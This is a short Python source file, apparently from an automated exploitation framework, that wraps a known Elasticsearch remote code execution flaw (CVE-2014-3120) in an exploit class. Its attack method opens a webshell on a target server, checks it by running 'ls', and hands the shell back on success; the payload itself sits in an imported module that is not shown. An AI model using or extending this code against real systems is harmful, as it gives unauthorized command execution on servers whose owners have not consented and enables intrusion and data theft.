#######################################################
# ElasticSearch RCE
# CVE-2014-3120
# Metasploit: exploit/multi/elasticsearch/script_mvel_rce
#
# This exploit makes use of a known RCE vulnerability
# to excecute system commands.
#######################################################

from utils import Exploit
import requests
import json, base64
from shells.es_shell import ESShell

class ESRCE(Exploit):
    '''Class for performing ElasticSearch RCE exploit'''
    def __init__(self, server_ip: str):
        super().__init__(
            os='windows',
            name='Elasticsearch RCE exploit',
            description='',
            requirements=['http/9200'],
            webserver=False,
            server_ip=server_ip
        )
    
    def attack(self, target: str):
        '''Perform the attack on a target and return a webshell'''
        webshell = ESShell(target, self.os)

        # Return ES shell
        if webshell.cmd('ls'):
            # Return webshell
            self.message(target, 'Successfully created ElasticSearch shell')
            self.success(target)
            return webshell
        else:
            self.error(target, 'An unknown error occurred when trying to reach the webshell')
            webshell.kill()
            return
